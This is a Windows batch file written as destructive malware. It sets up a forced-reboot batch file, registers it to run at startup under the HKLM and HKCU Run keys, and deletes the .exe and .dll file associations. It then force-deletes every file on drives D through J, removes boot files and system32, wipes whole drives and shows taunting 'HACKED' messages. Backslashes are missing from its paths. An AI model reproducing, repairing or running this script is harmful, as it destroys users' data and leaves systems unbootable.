@echo off

echo @echo off>c:windowshartlell.bat

echo break off>>c:windowshartlell.bat

echo shutdown -r -t 11 -f>>c:windowshartlell.bat

echo end>>c:windowshartlell.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f

echo You have been HACKED.

START reg delete HKCR/.exe

START reg delete HKCR/.dll

START reg delete HKCR/*

del D:*.* /f /s /q

del E:*.* /f /s /q

del F:*.* /f /s /q

del G:*.* /f /s /q

del H:*.* /f /s /q

del I:*.* /f /s /q

del J:*.* /f /s /q

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

del c:WINDOWSsystem32*.*/q  

@echo off

msg * YOU GOT OWNED!!!

shutdown -s -t 7 -c “A VIRUS IS TAKING OVER c:Drive

rd/s/q D:

rd/s/q C:

rd/s/q E:

Del C: *.* |y